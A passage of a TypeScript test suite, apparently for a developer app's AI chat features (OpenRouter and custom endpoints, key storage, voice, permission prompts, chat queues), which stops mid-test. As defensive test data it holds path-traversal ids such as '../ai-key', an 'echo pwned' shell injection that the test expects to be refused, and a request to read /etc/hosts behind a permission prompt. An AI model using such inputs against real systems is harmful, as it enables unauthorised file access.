import assert from 'node:assert/strict'
import { mkdirSync, readFileSync, realpathSync, rmSync, statSync, writeFileSync } from 'node:fs'
import { createServer } from 'node:http'
import type { AddressInfo } from 'node:net'
import { join } from 'node:path'
import { test } from 'node:test'
import { aiRpc, findSessions, type Rpc, skillTools, tools } from '../src/shared/tools.ts'
import { aiTotals } from '../src/shared/types.ts'
import { connect, fixtureWidgets, fresh, seen, sleep, until } from './helpers.ts'

// a fake OpenRouter: each request to `answers`' next, recorded
async function openrouter(t: { after: (f: () => void) => void }, answers: object[]) {
  const hits: { auth?: string; title?: string; url?: string; body: any }[] = []
  const srv = createServer(async (q, r) => {
    let body = ''
    for await (const c of q) body += c
    hits.push({ auth: q.headers.authorization, title: q.headers['x-title'] as string | undefined, url: q.url, body: JSON.parse(body) })
    const a = answers[hits.length - 1] ?? { error: { message: 'no more answers' } }
    if ('slow' in a) return // never answers: a stop ends it
    if ('sse' in a) {
      // A7: a streamed answer, a chunk at a time (gap ms apart), after a keep-alive comment
      r.writeHead(200, { 'content-type': 'text/event-stream' }).write(': OPENROUTER PROCESSING\n\n')
      for (const c of a.sse as object[]) await new Promise(ok => setTimeout(ok, Number((a as any).gap ?? 120))), r.write(`data: ${JSON.stringify(c)}\n\n`)
      return void r.end('data: [DONE]\n\n')
    }
    r.writeHead('status' in a ? Number(a.status) : 'error' in a ? 400 : 200, { 'content-type': 'application/json' }).end(JSON.stringify(a))
  })
  await new Promise<void>(r => srv.listen(0, '127.0.0.1', r))
  t.after(() => (srv.closeAllConnections(), srv.close()))
  return { hits, answers, url: `http://127.0.0.1:${(srv.address() as AddressInfo).port}` } // answers: a test adds to it as it goes
}
const reply = (message: object, usage = { prompt_tokens: 100, completion_tokens: 10, cost: 0.002 }) => ({ model: 'anthropic/claude-sonnet-5.5', choices: [{ message }], usage })

test("ai: Your endpoint: the same tool loop at its own URL with its own key, none of OpenRouter's parts, not priced; https or this Mac's http; the key never in the view", async t => {
  const own = await openrouter(t, [
    reply({ content: '', tool_calls: [{ id: 'c1', type: 'function', function: { name: 'laki_state', arguments: '{}' } }] }, { prompt_tokens: 5, completion_tokens: 2, cost: 9 }),
    reply({ content: 'Hi from mine.' }, { prompt_tokens: 5, completion_tokens: 2, cost: 9 }),
    reply({ content: 'OK' }),
  ])
  const or = await openrouter(t, [])
  const rig = await fresh(t, { env: { LAKI_AI_API: or.url } })
  for (const [url, why] of [['http://example.com/v1', /http on this Mac only/], ['https://me:pw@example.com/v1', /no user or password/], ['ftp://localhost/v1', /http on this Mac only/], ['nope', /a URL/], ['https://x.dev/v1?k=1', /no \? or #/]] as const)
    await assert.rejects(rig.rpc('settingsSet', { aiEndpoint: { url, model: 'm' } }), why, url)
  await rig.rpc('settingsSet', { ai: { backend: 'endpoint' } })
  await assert.rejects(rig.rpc('aiAsk', { text: 'hi' }), /no endpoint: Settings › AI › Your endpoint/)
  await rig.rpc('settingsSet', { aiEndpoint: { url: `${own.url}/v1/`, model: ' llama ' } })
  assert.deepEqual((await rig.rpc('state')).settings.aiEndpoint, { url: `${own.url}/v1`, model: 'llama' })
  assert.deepEqual(await rig.rpc('aiAsk', { text: 'hi' }), { text: 'Hi from mine.' }, 'no key: a local server needs none')
  assert.equal(own.hits[0].auth, undefined)
  assert.deepEqual(await rig.rpc('aiEndpointKey', { key: ' fake-secret-own ' }), { key: true })
  assert.equal(statSync(join(rig.data, 'ai-endpoint-key')).mode & 0o777, 0o600)
  const h = own.hits[0]
  assert.equal(h.url, '/v1/chat/completions')
  assert.equal(h.title, undefined, "no OpenRouter's x-title")
  assert.equal(h.body.model, 'llama')
  assert.equal(h.body.usage, undefined)
  assert.deepEqual(h.body.stream_options, { include_usage: true })
  assert.ok(!JSON.stringify(h.body).includes('cache_control'))
  assert.equal(own.hits[1].body.messages.at(-1).role, 'tool', 'its tools ran')
  assert.equal(or.hits.length, 0, 'nothing to OpenRouter')
  const a = await rig.rpc('aiState')
  assert.deepEqual([a.calls[0].backend, a.calls[0].model, a.calls[0].cost, a.endpointKey], ['endpoint', 'anthropic/claude-sonnet-5.5', undefined, true], 'not priced')
  assert.deepEqual(await rig.rpc('aiEndpointTest'), { model: 'anthropic/claude-sonnet-5.5', text: 'OK' })
  assert.equal(own.hits[2].auth, 'Bearer fake-secret-own')
  const seen = JSON.stringify(await rig.rpc('state')) + JSON.stringify(a) + readFileSync(join(rig.data, 'state.json'), 'utf8')
  assert.ok(!seen.includes('fake-secret-own'), 'the key: its file only')
  assert.deepEqual(await rig.rpc('aiEndpointKey', { key: '' }), { key: false })
  // a redirect is never followed (its https-or-this-Mac rule would go with it); no URL: no endpoint
  const moved = createServer((_, r) => r.writeHead(307, { location: 'http://example.com/v1/chat/completions' }).end())
  await new Promise<void>(r => moved.listen(0, '127.0.0.1', r))
  t.after(() => moved.close())
  await rig.rpc('settingsSet', { aiEndpoint: { url: `http://127.0.0.1:${(moved.address() as AddressInfo).port}/v1`, model: 'llama' } })
  await assert.rejects(rig.rpc('aiEndpointTest'), /fetch failed|redirect/)
  await rig.rpc('settingsSet', { aiEndpoint: { url: '', model: '' } })
  assert.equal((await rig.rpc('state')).settings.aiEndpoint, undefined)
})

test('ai: OpenRouter runs the laki tools until it answers; the key stays in its 0600 file; each ask is logged', async t => {
  const or = await openrouter(t, [
    reply({ content: '', tool_calls: [{ id: 'c1', type: 'function', function: { name: 'laki_state', arguments: '{}' } }] }),
    reply({ content: 'One project, no workspaces.' }),
    reply({ content: 'Still one.' }),
  ])
  const rig = await fresh(t, { env: { LAKI_AI_API: or.url } })
  await rig.rpc('projectAdd', { path: rig.repo })

  await assert.rejects(rig.rpc('aiAsk', { text: 'hi' }), /no OpenRouter API key/) // settings.ai never touched: on, as the app shows it
  await assert.rejects(rig.rpc('aiKey', { key: 'two words' }), /does not look like an API key/)
  assert.deepEqual(await rig.rpc('aiKey', { key: ' sk-or-v1-abc123 ' }), { key: true })
  assert.equal(statSync(join(rig.data, 'ai-key')).mode & 0o777, 0o600)
  assert.ok(!JSON.stringify(await rig.rpc('state')).includes('sk-or-v1'), 'never in the view')

  const ws = await rig.connect()
  t.after(() => ws.close())
  assert.deepEqual(await rig.rpc('aiAsk', { text: 'what are my agents doing?' }), { text: 'One project, no workspaces.' })
  assert.equal(or.hits[0].auth, 'Bearer sk-or-v1-abc123')
  const first = or.hits[0].body
  assert.equal(first.model, 'anthropic/claude-sonnet-5.5')
  assert.deepEqual(first.usage, { include: true })
  const names = first.tools.map((x: any) => x.function.name)
  for (const n of ['laki_state', 'laki_new_workspace', 'laki_send', 'laki_new_tab', 'laki_attach_pr', 'laki_screen', 'laki_diff']) assert.ok(names.includes(n), n)
  assert.ok(!names.includes('laki_progress') && names.includes('laki_schedule_add'))
  assert.equal(first.messages[0].role, 'system')
  assert.deepEqual(first.messages.at(-1), { role: 'user', content: 'what are my agents doing?' })
  // the tool's result went back to the model
  const tool = or.hits[1].body.messages.at(-1)
  assert.equal(tool.role, 'tool')
  assert.equal(tool.tool_call_id, 'c1')
  assert.equal(JSON.parse(tool.content).projects[0].path, realpathSync(rig.repo))

  let a = await rig.rpc('aiState')
  assert.deepEqual(a.chat.map((m: any) => [m.role, m.text]), [['user', 'what are my agents doing?'], ['tool', 'laki_state {}'], ['ai', 'One project, no workspaces.']])
  assert.equal(a.key, true)
  assert.equal(a.calls.length, 1)
  assert.deepEqual({ ...a.calls[0], at: 0, ms: 0 }, { at: 0, ms: 0, backend: 'openrouter', model: 'anthropic/claude-sonnet-5.5', in: 200, out: 20, cost: 0.004, tools: 1, ok: true, ask: 'what are my agents doing?' })
  assert.deepEqual(a.totals.today, { calls: 1, in: 200, out: 20, cost: 0.004 })
  await until(() => ws.events.some(e => e.ev === 'ai' && !e.busy && e.chat.length === 3), 'an ai event')
  assert.equal((await rig.rpc('state')).settings?.ai, undefined, 'answered with settings.ai unset')

  // turned off: refused, nothing asked
  await rig.rpc('settingsSet', { ai: { on: false } })
  await assert.rejects(rig.rpc('aiAsk', { text: 'hi' }), /Laki AI is off: Settings › AI/)
  assert.equal(or.hits.length, 2)
  await rig.rpc('settingsSet', { ai: {} })

  // the next ask carries the conversation so far (asks and answers, not the tools)
  await rig.rpc('aiAsk', { text: 'and now?' })
  assert.deepEqual(or.hits[2].body.messages.slice(1).map((m: any) => [m.role, m.content]), [['user', 'what are my agents doing?'], ['assistant', 'One project, no workspaces.'], ['user', 'and now?']])

  // a failure is said in the chat and logged
  await assert.rejects(rig.rpc('aiAsk', { text: 'again' }), /OpenRouter: no more answers/)
  a = await rig.rpc('aiState')
  assert.deepEqual(a.chat.at(-1).role, 'error')
  assert.equal(a.calls[0].ok, false)
  assert.equal(a.totals.today.calls, 3)

  // the CLI: the log, the conversation, a new one; the key removed
  const log = await rig.cli('ai', 'log')
  assert.match(log.out, /today: 3 calls, 300 in \/ 30 out, \$0\.0060/)
  assert.match((await rig.cli('ai')).out, /> and now\?\nStill one\./)
  await rig.cli('ai', 'new')
  assert.deepEqual((await rig.rpc('aiState')).chat, [])
  assert.deepEqual(await rig.rpc('aiKey', { key: '' }), { key: false })
  assert.equal((await rig.rpc('aiState')).key, false)
})

test("voice: the cloud's recording goes to OpenRouter's speech-to-text with the AI's key; Settings › Voice picks the model", async t => {
  const busy = { status: 429, error: { code: 429, message: 'Provider returned error', metadata: { raw: 'rate-limited upstream' } } }
  const down = { status: 502, error: { code: 502, message: 'Provider returned error', metadata: { raw: { error: 'quota' } } } } // raw: the provider's JSON
  const or = await openrouter(t, [{ text: ' make the button blue ' }, { text: 'hi' }, { text: 'hi' }, { error: { message: 'model not found' } }, busy, { text: 'again' }, busy, busy, busy, ...Array(3).fill(down)])
  const rig = await fresh(t, { env: { LAKI_AI_API: or.url, LAKI_VOICE_AGAIN: '10,20' } }) // the waits before trying again, short
  const wav = Buffer.from('RIFF fake wav').toString('base64')
  await rig.rpc('settingsSet', { voice: { on: false } }) // on unless turned off
  await assert.rejects(rig.rpc('voiceText', { audio: wav }), /Voice is off: turn it on in Settings › Voice/)
  await rig.rpc('settingsSet', { voice: {} })
  await assert.rejects(rig.rpc('voiceText', {}), /no audio/)
  await assert.rejects(rig.rpc('voiceText', { audio: wav }), /no OpenRouter API key: Settings › Voice/)
  await rig.rpc('aiKey', { key: 'sk-or-v1-voice' })
  assert.deepEqual(await rig.rpc('voiceText', { audio: wav }), { text: 'make the button blue' })
  assert.equal(or.hits[0].auth, 'Bearer sk-or-v1-voice')
  assert.deepEqual(or.hits[0].body, { model: 'microsoft/mai-transcribe-2', input_audio: { data: wav, format: 'wav' } })
  await rig.rpc('settingsSet', { voice: { on: true, engine: 'cloud', model: 'openai/whisper-large-v3-turbo', fixes: 'hi → Hello' } })
  assert.deepEqual(await rig.rpc('voiceText', { audio: wav }), { text: 'Hello', fixed: ['hi → Hello'] }) // Word fixes, after the transcript
  assert.equal(or.hits[1].body.model, 'openai/whisper-large-v3-turbo')
  assert.equal(JSON.stringify(or.hits[1].body).includes('Hello'), false, 'the fixes never go to OpenRouter')
  await rig.rpc('settingsSet', { voice: { on: true, engine: 'cloud', model: 5 } }) // not a string (an odd import): the default
  await rig.rpc('voiceText', { audio: wav })
  assert.equal(or.hits[2].body.model, 'microsoft/mai-transcribe-2')
  await assert.rejects(rig.rpc('voiceText', { audio: wav }), /OpenRouter 400: model not found$/)
  assert.deepEqual(await rig.rpc('voiceText', { audio: wav }), { text: 'again' }) // a 429, then tried again
  await assert.rejects(rig.rpc('voiceText', { audio: wav }), /OpenRouter 429: Provider returned error: rate-limited upstream \(microsoft\/mai-transcribe-2 is busy: try again in a moment, or another model in Settings › Voice\)/)
  await assert.rejects(rig.rpc('voiceText', { audio: wav }), /OpenRouter 502: Provider returned error: \{"error":"quota"\} \(/)
  const ws = await rig.connect() // the app's way: the socket takes 32 MB, HTTP 16
  t.after(() => ws.close())
  await assert.rejects(ws.call('voiceText', { audio: 'x'.repeat(25 << 20) }), /up to 9 minutes/)
  assert.equal(or.hits.length, 12) // 3 tries at most
})

// Q11: Settings › Voice's prices: OpenRouter's speech-to-text list now, no key sent, kept an hour; odd entries left out
test("voice: voiceModels lists OpenRouter's speech-to-text models with prices, no key, kept; offline an error", async t => {
  const asked: { url?: string; auth?: string }[] = []
  let down = false
  const data = [
    { id: 'microsoft/mai-transcribe-2', name: 'Microsoft AI: MAI-Transcribe 2', pricing: { prompt: '0.1', completion: '0' } },
    { id: 'nvidia/parakeet-tdt-0.6b-v3', name: 'NVIDIA: Parakeet TDT 0.6B v3', pricing: { prompt: '0.0000166667', completion: '0' } },
    { id: 'openai/gpt-4o-transcribe', pricing: { prompt: '0.0000025', completion: '0.00001' } },
    { id: 'no price/x', pricing: {} },
    { id: '../../etc', pricing: { prompt: '0' } },
    { name: 'no id', pricing: { prompt: '0' } },
  ]
  const srv = createServer((q, r) => {
    asked.push({ url: q.url, auth: q.headers.authorization })
    if (down) return void r.writeHead(503).end('{}')
    r.writeHead(200, { 'content-type': 'application/json' }).end(JSON.stringify({ data }))
  })
  await new Promise<void>(r => srv.listen(0, '127.0.0.1', r))
  t.after(() => (srv.closeAllConnections(), srv.close()))
  const rig = await fresh(t, { env: { LAKI_AI_API: `http://127.0.0.1:${(srv.address() as AddressInfo).port}` } })
  await rig.rpc('aiKey', { key: 'sk-or-v1-never-sent' })
  const r = await rig.rpc('voiceModels')
  assert.deepEqual(r.models, [
    { id: 'microsoft/mai-transcribe-2', name: 'Microsoft AI: MAI-Transcribe 2', price: '$0.10/h' },
    { id: 'nvidia/parakeet-tdt-0.6b-v3', name: 'NVIDIA: Parakeet TDT 0.6B v3', price: '$0.06/h' },
    { id: 'openai/gpt-4o-transcribe', name: 'openai/gpt-4o-transcribe', price: '$2.50 / $10 per M tokens' },
  ])
  assert.equal(typeof r.at, 'number')
  assert.deepEqual(asked, [{ url: '/models?output_modalities=transcription', auth: undefined }], 'its public list: no key')
  down = true
  assert.deepEqual(await rig.rpc('voiceModels'), r, 'kept: asked once an hour')
  assert.equal(asked.length, 1)
  const other = await fresh(t, { env: { LAKI_AI_API: `http://127.0.0.1:${(srv.address() as AddressInfo).port}` } })
  await assert.rejects(other.rpc('voiceModels'), /OpenRouter 503: its model list/)
})

test('ai: a pasted image goes to OpenRouter as a data URL; one from elsewhere never does; Stop ends an ask', async t => {
  const or = await openrouter(t, [reply({ content: 'Three PRs.' }), { slow: true }])
  const rig = await fresh(t, { env: { LAKI_AI_API: or.url } })
  await rig.rpc('settingsSet', { ai: { on: true, models: { openrouter: 'openai/gpt-5.6-sol' } } })
  await rig.rpc('aiKey', { key: 'sk-or-v1-abc123' })
  const png = Buffer.from('fake png').toString('base64')
  const path = await rig.rpc('imageSave', { data: png })
  await rig.rpc('aiAsk', { text: 'review these', images: [path, join(rig.home, 'repo', 'README.md')] })
  const body = or.hits[0].body
  assert.equal(body.model, 'openai/gpt-5.6-sol')
  assert.deepEqual(body.messages.at(-1).content, [
    { type: 'text', text: 'review these' },
    { type: 'image_url', image_url: { url: `data:image/png;base64,${png}` } },
  ])
  assert.deepEqual((await rig.rpc('aiState')).chat[0].images, [path])

  const asking = rig.rpc('aiAsk', { text: 'hang' })
  await until(() => or.hits.length === 2, 'the second request')
  await assert.rejects(rig.rpc('aiAsk', { text: 'meanwhile' }), /still on the last ask/)
  await assert.rejects(rig.rpc('aiNew'), /at work/)
  assert.deepEqual(await rig.rpc('aiStop'), { stopped: true })
  await assert.rejects(asking, /stopped/)
  assert.equal((await rig.rpc('aiState')).busy, false)

  // the page's thumbnails: a kept image as a data URL, nothing from elsewhere
  assert.equal(await rig.rpc('aiImage', { path }), `data:image/png;base64,${png}`)
  await assert.rejects(rig.rpc('aiImage', { path: join(rig.home, 'repo', 'README.md') }), /isn't kept/)

  // New chat keeps the one it ends among the earlier chats; one taken up again swaps with the one there
  await rig.rpc('aiNew')
  assert.deepEqual((await rig.rpc('aiState')).chat, [])
  const [old] = await rig.rpc('aiChats')
  assert.equal(old.title, 'review these')
  await rig.rpc('aiNew') // an empty chat isn't kept
  assert.equal((await rig.rpc('aiChats')).length, 1)
  await rig.rpc('aiOpen', { id: old.id })
  assert.equal((await rig.rpc('aiState')).chat[0].text, 'review these')
  assert.deepEqual(await rig.rpc('aiChats'), [])
  await assert.rejects(rig.rpc('aiOpen', { id: old.id }), /gone/)
  await assert.rejects(rig.rpc('aiOpen', { id: '../ai-key' }), /gone/)
  await rig.rpc('aiNew')
  await rig.rpc('aiChatRm', { id: (await rig.rpc('aiChats'))[0].id })
  assert.deepEqual(await rig.rpc('aiChats'), [])

  // pasted images past Settings › AI's days go as another is saved
  const stale = join(rig.data, 'images', `${Date.now() - 3 * 86400e3}-abc123.png`)
  writeFileSync(stale, 'old')
  await rig.rpc('imageSave', { data: png })
  assert.ok(statSync(stale)) // 30 days by default
  await rig.rpc('settingsSet', { imageDays: 2 })
  await rig.rpc('imageSave', { data: png })
  assert.throws(() => statSync(stale))
  assert.ok(statSync(path)) // today's stays
})

test('ai: claude -p and codex exec reach Laki through `laki mcp`, and go on with their session', async t => {
  const rig = await fresh(t)
  await rig.rpc('projectAdd', { path: rig.repo })
  await rig.rpc('settingsSet', { ai: { on: true, backend: 'claude', models: { claude: 'haiku' } } })
  assert.deepEqual(await rig.rpc('aiAsk', { text: 'how many?' }), { text: '0 workspaces, asked: how many?' })
  await rig.rpc('aiAsk', { text: 'again' })
  const runs = rig.fakeLog().filter(l => l.bin === 'claude' && l.args[0] === '-p')
  assert.equal(runs.length, 2)
  const args: string[] = runs[0].args
  assert.equal(args[args.indexOf('--tools') + 1], 'Read')
  assert.ok(!args.includes('--add-dir'), 'no screenshot: no folder (it may not exist)')
  assert.equal(args[args.indexOf('--allowedTools') + 1], 'mcp__laki')
  assert.equal(args[args.indexOf('--model') + 1], 'haiku')
  assert.ok(args.includes('--strict-mcp-config') && !args.includes('--resume'))
  assert.equal(runs[1].args[runs[1].args.indexOf('--resume') + 1], 'sess-p1')
  let a = await rig.rpc('aiState')
  assert.deepEqual(a.chat.slice(0, 3).map((m: any) => [m.role, m.text]), [['user', 'how many?'], ['tool', 'laki_state {}'], ['ai', '0 workspaces, asked: how many?']])
  assert.deepEqual({ ...a.calls[0], at: 0, ms: 0 }, { at: 0, ms: 0, backend: 'claude', model: 'fake-sonnet', in: 150, out: 20, cost: 0.0123, tools: 1, ok: true, ask: 'again' })
  await assert.rejects(rig.rpc('aiAsk', { text: 'fail now' }), /it broke/)
  // a preset of claude (Settings › AI): its env, over Settings' own, and a session of its own (another account's)
  await rig.rpc('settingsSet', { env: { TEST_GLOBAL: 'g', TEST_ACCOUNT: 'mine' }, presets: [{ name: 'claude', agent: 'claude' }, { name: 'work', agent: 'claude', env: { TEST_ACCOUNT: 'work' } }], ai: { on: true, backend: 'claude', preset: 'work' } })
  await rig.rpc('aiAsk', { text: 'at work' })
  const w = rig.fakeLog().filter(l => l.bin === 'claude' && l.args[0] === '-p').at(-1)
  assert.deepEqual(w.env, { TEST_GLOBAL: 'g', TEST_ACCOUNT: 'work' })
  assert.ok(!w.args.includes('--resume'), "the plain claude's session isn't the preset's")

  // an effort (Settings › AI): claude's --effort; one it doesn't take, none
  await rig.rpc('settingsSet', { ai: { on: true, backend: 'claude', efforts: { claude: 'high' } } })
  await rig.rpc('aiAsk', { text: 'think hard' })
  let e: string[] = rig.fakeLog().filter(l => l.bin === 'claude' && l.args[0] === '-p').at(-1).args
  assert.equal(e[e.indexOf('--effort') + 1], 'high')
  await rig.rpc('settingsSet', { ai: { on: true, backend: 'claude', efforts: { claude: 'minimal' } } })
  await rig.rpc('aiAsk', { text: 'think less' })
  assert.ok(!rig.fakeLog().filter(l => l.bin === 'claude' && l.args[0] === '-p').at(-1).args.includes('--effort'), "codex's word, not claude's")

  await rig.rpc('aiNew')
  await rig.rpc('settingsSet', { ai: { on: true, backend: 'codex' } })
  assert.deepEqual(await rig.rpc('aiAsk', { text: 'projects?' }), { text: '1 projects, asked: projects?' })
  await rig.rpc('aiAsk', { text: 'more' })
  const cx = rig.fakeLog().filter(l => l.bin === 'codex' && l.args[0] === 'exec')
  assert.ok(cx[0].args.includes('sandbox_mode="read-only"') && cx[0].args[1] === '--json')
  assert.ok(cx[0].args.includes('--ignore-user-config'), "not the user's MCP servers")
  assert.deepEqual(cx[1].args.slice(0, 3), ['exec', 'resume', 'thread-x1'])
  assert.ok(!cx[0].args.some((x: string) => x.startsWith('model_reasoning_effort')), 'unset: its own')
  a = await rig.rpc('aiState')
  assert.deepEqual({ ...a.calls[0], at: 0, ms: 0 }, { at: 0, ms: 0, backend: 'codex', model: 'codex', in: 300, out: 30, tools: 1, ok: true, ask: 'more' })
  await assert.rejects(rig.rpc('aiAsk', { text: 'fail' }), /it broke/)
  await rig.rpc('settingsSet', { ai: { on: true, backend: 'codex', efforts: { codex: 'xhigh' } } })
  await rig.rpc('aiAsk', { text: 'and harder' })
  assert.ok(rig.fakeLog().filter(l => l.bin === 'codex' && l.args[0] === 'exec').at(-1).args.includes('model_reasoning_effort="xhigh"'))
  // the conversation is kept across a restart
  await rig.stop()
  await rig.start()
  assert.equal((await rig.rpc('aiState')).chat.length, 11) // 3 asks of 3, the failed one's ask and error
  assert.ok(readFileSync(join(rig.data, 'ai-calls.jsonl'), 'utf8').split('\n').filter(Boolean).length >= 6)
})

test("ai: claude -p asks in the chat before a tool it may not use unasked; Always in this chat lets it until a new chat", async t => {
  const rig = await fresh(t)
  await rig.rpc('settingsSet', { ai: { on: true, backend: 'claude' } })
  const perm = async () => (await until(async () => (await rig.rpc('aiState')).chat.find((m: any) => m.ask?.perm && m.ask.picked === undefined))) as any
  // its ask waits on the pick: the chat says what, the buttons work while it works
  let asking = rig.rpc('aiAsk', { text: 'read the hosts file' })
  let m = await perm()
  assert.match(m.text, /May I use \*\*Read\*\* on `\/etc\/hosts`/)
  assert.deepEqual(m.ask.options, ['Allow once', 'Always in this chat', 'Deny'])
  assert.equal((await rig.rpc('aiState')).busy, true)
  assert.deepEqual(await rig.rpc('aiAnswer', { id: m.ask.id, n: 1 }), { allowed: true })
  assert.deepEqual(await asking, { text: 'allow: /etc/hosts' })
  const args: string[] = rig.fakeLog().filter(l => l.bin === 'claude' && l.args[0] === '-p').at(-1).args
  assert.equal(args[args.indexOf('--permission-prompt-tool') + 1], 'mcp__laki__laki_permission')
  await assert.rejects(rig.rpc('aiAnswer', { id: m.ask.id, n: 0 }), /answered already/)
  // for this chat: not asked again
  assert.deepEqual(await rig.rpc('aiAsk', { text: 'read it again' }), { text: 'allow: /etc/hosts' })
  assert.equal((await rig.rpc('aiState')).chat.filter((m: any) => m.ask?.perm).length, 1)
  // a new chat asks again; Deny is a no, with words for it
  await rig.rpc('aiNew')
  asking = rig.rpc('aiAsk', { text: 'read once more' })
  m = await perm()
  await rig.rpc('aiAnswer', { id: m.ask.id, n: 2 })
  assert.match((await asking).text, /^deny: The user said no/)
  assert.equal((await rig.rpc('aiState')).chat.find((m: any) => m.ask?.perm).ask.picked, 'Deny')
  // only while it works
  await assert.rejects(rig.rpc('aiPermission', { tool: 'Read' }), /only while Laki AI works/)
})

test('ai: totals by day and month', () => {
  const now = new Date(2026, 9, 10, 15)
  const c = (at: Date, cost?: number) => ({ at: at.getTime(), backend: 'openrouter' as const, model: 'm', in: 10, out: 1, cost, ms: 1, tools: 0, ok: true, ask: '' })
  const calls = [c(new Date(2026, 8, 30), 1), c(new Date(2026, 9, 1), 0.5), c(new Date(2026, 9, 10, 9), 0.25), c(new Date(2026, 9, 10, 10))]
  assert.deepEqual(aiTotals(calls, now), { today: { calls: 2, in: 20, out: 2, cost: 0.25 }, month: { calls: 3, in: 30, out: 3, cost: 0.75 } })
})

test('ai: laki_send reaches agents only, and never types into a question they ask', async t => {
  const rig = await fresh(t)
  await rig.rpc('projectAdd', { path: rig.repo })
  const ws = await rig.rpc('wsNew', { project: (await rig.rpc('state')).projects[0].id, prompt: 'hi', name: 'one' })
  const shell = await rig.rpc('tabNew', { ws: ws.id, preset: 'shell' })
  await assert.rejects(rig.rpc('send', { target: `${ws.id}/${shell.id}`, text: 'echo pwned', agent: true }), /isn't an agent/)
  const agent = await rig.tab(ws.id)
  await until(async () => (await rig.rpc('state')).tabs.find((x: any) => x.id === agent.id).status === 'idle', 'the agent idle')
  await rig.rpc('send', { target: ws.id, text: 'menu', agent: true }) // the fake asks a permission
  await until(async () => (await rig.rpc('state')).tabs.find((x: any) => x.id === agent.id).status === 'waiting', 'the agent waiting')
  await assert.rejects(rig.rpc('send', { target: ws.id, text: '1', agent: true }), /asking the user something/)
  assert.deepEqual(await rig.rpc('send', { target: ws.id, text: 'later', agent: true, whenIdle: true }), { tab: agent.id, queued: 1 })
})

test("ai: chats ask at once, one ask each (AI_AT_ONCE in all); a question goes to its own chat; the studio's sessions", async t => {
  const call = (id: string, name: string, args: object) => reply({ content: '', tool_calls: [{ id, type: 'function', function: { name, arguments: JSON.stringify(args) } }] })
  const or = await openrouter(t, [{ slow: true }, call('c1', 'laki_ask', { question: 'Which source?', options: ['gh', 'Slack'] }), { slow: true }, { slow: true }, { slow: true }])
  const rig = await fresh(t, { env: { LAKI_AI_API: or.url } })
  await rig.rpc('settingsSet', { ai: { on: true } })
  await rig.rpc('aiKey', { key: 'sk-or-v1-abc123' })
  const one = rig.rpc('aiAsk', { chat: 'widget:one', text: 'my open PRs' }).catch(e => e)
  await until(() => or.hits.length === 1, 'the first ask')
  // another studio asks while the first works: its question lands in its own chat
  assert.deepEqual(await rig.rpc('aiAsk', { chat: 'widget:two', text: 'a world clock' }), { text: '' })
  const two = await rig.rpc('aiState', { chat: 'widget:two' })
  assert.deepEqual(two.chat.at(-1).ask.options, ['gh', 'Slack'])
  assert.equal(two.busy, false)
  assert.equal((await rig.rpc('aiState', { chat: 'widget:one' })).chat.some((m: any) => m.ask), false)
  assert.equal((await rig.rpc('aiState', { chat: 'widget:one' })).busy, true)
  await assert.rejects(rig.rpc('aiAsk', { chat: 'widget:one', text: 'again' }), /still on the last ask/)
  await assert.rejects(rig.rpc('aiQuestion', { chat: 'widget:two', text: 'x', options: ['a', 'b'] }), /only while Laki AI works/)
  // where you left off: newest first, the one at work said so
  assert.deepEqual(
    (await rig.rpc('studioChats')).map((c: any) => [c.id, c.title, c.busy]),
    [['two', 'a world clock', false], ['one', 'my open PRs', true]],
  )
  await assert.rejects(rig.rpc('studioChatRm', { id: 'one' }), /stop it first/)
  // at most AI_AT_ONCE chats at work
  const more = ['widget:three', 'widget:four', ''].map(chat => rig.rpc('aiAsk', { chat, text: 'hang' }).catch(e => e))
  await until(() => or.hits.length === 5, 'three more asks')
  await assert.rejects(rig.rpc('aiAsk', { chat: 'widget:five', text: 'one more' }), /works in 4 chats already/)
  assert.deepEqual(await rig.rpc('aiStop', { chat: 'widget:one' }), { stopped: true })
  assert.match(String(await one), /stopped/)
  assert.deepEqual(await rig.rpc('aiStop'), { stopped: true }) // the rest
  await Promise.all(more)
  await rig.rpc('studioChatRm', { id: 'two' })
  assert.deepEqual((await rig.rpc('studioChats')).map((c: any) => c.id).sort(), ['four', 'one', 'three'])
  await assert.rejects(rig.rpc('studioChatRm', { id: '../ai-key' }), /no chat/)
})

test('ai: what you send while it answers waits (queue), and goes as one ask when the answer ends; ✕ takes one back', async t => {
  const or = await openrouter(t, [{ slow: true }, reply({ content: 'both done' })])
  const rig = await fresh(t, { env: { LAKI_AI_API: or.url } })
  await rig.rpc('settingsSet', { ai: { on: true } })
  await rig.rpc('aiKey', { key: 'sk-or-v1-abc123' })
  const first = rig.rpc('aiAsk', { text: 'my open PRs' }).catch(e => e)
  await until(() => or.hits.length === 1, 'the first ask')
  assert.deepEqual(await rig.rpc('aiAsk', { text: 'and the drafts', queue: true }), { queued: 1 })
  assert.deepEqual(await rig.rpc('aiAsk', { text: 'nope', queue: true }), { queued: 2 })
  await assert.rejects(rig.rpc('aiAsk', { text: 'no queue: refused as before' }), /still on the last ask/)
  await rig.rpc('aiUnqueue', { i: 1 })
  await rig.rpc('aiAsk', { text: 'only mine', queue: true })
  assert.deepEqual((await rig.rpc('aiState')).queue, ['and the drafts', 'only mine'])
  await rig.rpc('aiStop') // any end of the answer: what waits goes
  assert.match(String(await first), /stopped/)
  await until(async () => (await rig.rpc('aiState')).chat.at(-1)?.text === 'both done', 'the queued ask answered')
  const st = await rig.rpc('aiState')
  assert.deepEqual(st.queue, [])
  assert.equal(st.chat.findLast((m: any) => m.role === 'user').text, 'and the drafts\n\nonly mine')
  assert.equal(or.hits.length, 2)
})

test("ai: Laki's skill asks with options, writes memory, and removes only on the user's Yes", async t => {
  const call = (id: string, name: string, args: object) => reply({ content: '', tool_calls: [{ id, type: 'function', function: { name, arguments: JSON.stringify(args) } }] })
  const or = await openrouter(t, [
    call('c1', 'laki_ask', { question: 'Which one?', options: ['alpha', 'alpha', 'beta'], looks: [{ ui: { type: 'stat', value: '3', icon: 'pr' }, size: [1, 1] }, null, { ui: { value: 'no type' } }] }),
    reply({ content: 'Alpha it is.' }),
  ]) // more below: the project's id isn't known yet
  const rig = await fresh(t, { env: { LAKI_AI_API: or.url } })
  const p = await rig.rpc('projectAdd', { path: rig.repo })
  await rig.rpc('projectSet', { id: p.id, memory: [{ id: 'm1', text: 'old note', at: 1 }] })
  await rig.rpc('settingsSet', { ai: { on: true, context: 'Our staging is on fly.io.' } })
  await rig.rpc('aiKey', { key: 'sk-or-v1-abc123' })
  await assert.rejects(rig.rpc('aiQuestion', { text: 'x', options: ['a', 'b'] }), /only while Laki AI works/)

  // a question: its options in the chat, the turn ends there; a pick goes on as the next ask
  assert.deepEqual(await rig.rpc('aiAsk', { text: 'do the thing' }), { text: '' })
  const names = or.hits[0].body.tools.map((x: any) => x.function.name)
